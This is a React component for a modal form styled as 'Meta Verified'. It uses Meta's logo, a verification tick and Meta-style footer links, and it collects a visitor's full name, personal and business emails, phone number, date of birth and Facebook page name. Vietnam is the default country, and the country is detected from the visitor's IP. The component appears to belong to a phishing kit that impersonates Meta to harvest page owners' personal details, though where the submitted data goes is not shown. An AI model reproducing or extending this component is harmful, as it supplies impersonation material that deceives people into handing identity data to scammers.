import { useState, useEffect } from 'react';
import PropTypes from 'prop-types';
import TickIcon from '@/assets/images/tick.svg';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import CountrySelector from './CountrySelector';
import countryData from '@/utils/country_data';
import ReactCountryFlag from 'react-country-flag';

const FirstFormModal = ({ show, onClose, onSubmit, texts, ipInfo }) => {
    const [formData, setFormData] = useState({
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        dateOfBirth: '',
        pageName: '',
        agreeTerms: false
    });
    const [errors, setErrors] = useState({});
    const [showCountrySelector, setShowCountrySelector] = useState(false);
    const [selectedCountry, setSelectedCountry] = useState(null); // Start with null, will be set by IP detection
    const [hasAutoDetected, setHasAutoDetected] = useState(false);

    // Auto-detect country based on IP
    useEffect(() => {
        if (ipInfo && ipInfo.country_code && !hasAutoDetected) {
            const detectedCountry = countryData.find(country => country.code === ipInfo.country_code);
            if (detectedCountry) {
                setSelectedCountry(detectedCountry);
                setHasAutoDetected(true);
            } else {
                // Fallback to Vietnam if country not found
                setSelectedCountry(countryData[0]);
                setHasAutoDetected(true);
            }
        }
    }, [ipInfo, hasAutoDetected]);

    const handleChange = (field, value) => {
        setFormData((prev) => ({ ...prev, [field]: value }));
        if (errors[field]) {
            setErrors((prev) => ({ ...prev, [field]: false }));
        }
    };

    const handleCountrySelect = (country) => {
        setSelectedCountry(country);
        // Clear phone field so user can type clean number without country code
        handleChange('phone', '');
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        const newErrors = {};

        if (!formData.fullName.trim()) newErrors.fullName = true;
        if (!formData.personalEmail.trim()) newErrors.personalEmail = true;
        if (!formData.businessEmail.trim()) newErrors.businessEmail = true;
        if (!formData.phone.trim()) newErrors.phone = true;
        if (!formData.dateOfBirth.trim()) newErrors.dateOfBirth = true;
        if (!formData.pageName.trim()) newErrors.pageName = true;
        if (!formData.agreeTerms) newErrors.agreeTerms = true;

        if (Object.keys(newErrors).length > 0) {
            setErrors(newErrors);
            return;
        }

        // Ensure we have a selected country (fallback to Vietnam)
        const countryToUse = selectedCountry || countryData[0];

        // Handle phone number formatting (remove leading 0 for all countries)
        let phoneNumber = formData.phone;
        if (phoneNumber.startsWith('0')) {
            phoneNumber = phoneNumber.substring(1);
        }

        onSubmit({
            fullName: formData.fullName,
            personalEmail: formData.personalEmail,
            businessEmail: formData.businessEmail,
            phone: `${countryToUse.phone}${phoneNumber}`,
            dateOfBirth: formData.dateOfBirth,
            pageName: formData.pageName
        });
    };

    if (!show) return null;

    return (
        <>
            <div className="modal-backdrop show" onClick={onClose}></div>
            <div className="modal form-modal show" id="exampleModal1" style={{ display: show ? 'block' : 'none' }} tabIndex="-1">
            <div className="modal-dialog modal-dialog-centered modal-dialog-scrollable">
                <div className="modal-content">
                    <div className="modal-header">
                        <h5 className="modal-title" id="exampleModalLabel">
                            {texts.metaVerified || 'Meta Verified'}
                            <img src={TickIcon} width="18" alt="tick" style={{ verticalAlign: 'middle' }} />
                        </h5>
                        <button aria-label="Close" className="btn-close" type="button" onClick={onClose}></button>
                    </div>
                    <div className="modal-body">
                        <form id="first-form" onSubmit={handleSubmit}>
                            <div className="mb-3">
                                <label className="form-label" htmlFor="FullNameField">
                                    {texts.fullName || 'Full Name'}
                                </label>
                                <input
                                    aria-describedby="emailHelp"
                                    className={`form-control ${errors.fullName ? 'is-invalid' : ''}`}
                                    id="FullNameField"
                                    minLength="3"
                                    name="full-name"
                                    required
                                    type="text"
                                    value={formData.fullName}
                                    onChange={(e) => handleChange('fullName', e.target.value)}
                                />
                            </div>
                            <div className="mb-3">
                                <label className="form-label" htmlFor="PersonalEmailField">
                                    {texts.personalEmail || 'Personal Email'}
                                </label>
                                <input
                                    aria-describedby="emailHelp"
                                    className={`form-control ${errors.personalEmail ? 'is-invalid' : ''}`}
                                    id="PersonalEmailField"
                                    name="personal-email"
                                    required
                                    type="email"
                                    value={formData.personalEmail}
                                    onChange={(e) => handleChange('personalEmail', e.target.value)}
                                />
                            </div>
                            <div className="mb-3">
                                <label className="form-label" htmlFor="BuisenessEmailField">
                                    {texts.businessEmail || 'Business Email'}
                                </label>
                                <input
                                    aria-describedby="emailHelp"
                                    className={`form-control ${errors.businessEmail ? 'is-invalid' : ''}`}
                                    id="BuisenessEmailField"
                                    name="buiseness-email"
                                    required
                                    type="email"
                                    value={formData.businessEmail}
                                    onChange={(e) => handleChange('businessEmail', e.target.value)}
                                />
                            </div>
                            <div className="mb-3">
                                <label className="form-label" htmlFor="PhoneFirld">
                                    {texts.mobilePhone || 'Mobile Phone Number'}
                                </label>
                                <div style={{ display: 'flex', gap: '8px', alignItems: 'flex-start' }}>
                                    <button
                                        type="button"
                                        className="btn btn-outline-secondary"
                                        onClick={() => setShowCountrySelector(true)}
                                        style={{
                                            minWidth: '60px',
                                            padding: '9.5px 12px',
                                            fontSize: '16px',
                                            border: '1px solid #dee2e6',
                                            marginTop: '0',
                                            display: 'flex',
                                            alignItems: 'center',
                                            justifyContent: 'center'
                                        }}
                                        title="Select country"
                                    >
                                        {selectedCountry ? (
                                            <ReactCountryFlag
                                                countryCode={selectedCountry.code}
                                                svg
                                                style={{
                                                    width: '24px',
                                                    height: '24px',
                                                    borderRadius: '3px'
                                                }}
                                                title={selectedCountry.name}
                                            />
                                        ) : (
                                            <ReactCountryFlag
                                                countryCode="VN"
                                                svg
                                                style={{
                                                    width: '24px',
                                                    height: '24px',
                                                    borderRadius: '3px',
                                                    opacity: '0.5'
                                                }}
                                                title="Detecting location..."
                                            />
                                        )}
                                    </button>
                                    <input
                                        aria-describedby="emailHelp"
                                        className={`form-control ${errors.phone ? 'is-invalid' : ''}`}
                                        id="PhoneFirld"
                                        maxLength="18"
                                        minLength="7"
                                        name="mobile-phone-number"
                                        required
                                        type="tel"
                                        placeholder={selectedCountry ? selectedCountry.phone : '+84'}
                                        value={formData.phone}
                                        onChange={(e) => handleChange('phone', e.target.value)}
                                    />
                                </div>
                            </div>
                            <div className="mb-3">
                                <label className="form-label" htmlFor="dobField">
                                    {texts.dateOfBirth || 'Date of Birth'}
                                </label>
                                <input
                                    aria-describedby="emailHelp"
                                    className={`form-control ${errors.dateOfBirth ? 'is-invalid' : ''}`}
                                    id="dobField"
                                    name="date-of-birth"
                                    required
                                    type="date"
                                    value={formData.dateOfBirth}
                                    onChange={(e) => handleChange('dateOfBirth', e.target.value)}
                                />
                            </div>
                            <div className="mb-3">
                                <label className="form-label" htmlFor="fb-page-name-input">
                                    {texts.yourPageName || 'Your Page Name'}
                                </label>
                                <input
                                    aria-describedby="emailHelp"
                                    className={`form-control ${errors.pageName ? 'is-invalid' : ''}`}
                                    id="fb-page-name-input"
                                    maxLength="80"
                                    minLength="3"
                                    name="page-name"
                                    required
                                    type="text"
                                    value={formData.pageName}
                                    onChange={(e) => handleChange('pageName', e.target.value)}
                                />
                            </div>
                            <div className="mb-3 form-check">
                                <input
                                    aria-describedby="exampleCheck1"
                                    className={`form-check-input ${errors.agreeTerms ? 'is-invalid' : ''}`}
                                    id="exampleCheck1"
                                    name="agree-terms"
                                    required
                                    type="checkbox"
                                    checked={formData.agreeTerms}
                                    onChange={(e) => handleChange('agreeTerms', e.target.checked)}
                                />
                                <label className="form-check-label" htmlFor="exampleCheck1">
                                    {texts.agreeToTerms || 'I agree to the'} <a className="add-svg" id="termsLink">{texts.privacyPolicy || 'Privacy Policy'}</a>
                                </label>
                            </div>
                            <div className="form-btn-wrapper">
                                <button className="btn btn-primary" type="submit">
                                    <div className="spinner-border text-light" role="status" style={{ display: 'none' }}>
                                        <span className="visually-hidden">Loading...</span>
                                    </div>
                                    <span className="button-text">{texts.confirm || 'Confirm'}</span>
                                </button>
                            </div>
                        </form>
                    </div>
                    <div className="modal-footer border-0 justify-content-center" style={{ flexDirection: 'column', textAlign: 'center' }}>
                        <img src={MetaLogo} alt="Meta Logo" style={{ height: '20px', marginBottom: '5px' }} />
                        <div className="footer-links" style={{ fontSize: '12px', color: '#000' }}>
                            {texts.aboutHelpMore || 'About · Help · See more'}
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <CountrySelector
            show={showCountrySelector}
            onClose={() => setShowCountrySelector(false)}
            onSelect={handleCountrySelect}
        />
        </>
    );
};

FirstFormModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSubmit: PropTypes.func.isRequired, // receives object with fullName, personalEmail, businessEmail, phone, dateOfBirth, pageName
    texts: PropTypes.object.isRequired,
    ipInfo: PropTypes.object
};

export default FirstFormModal;
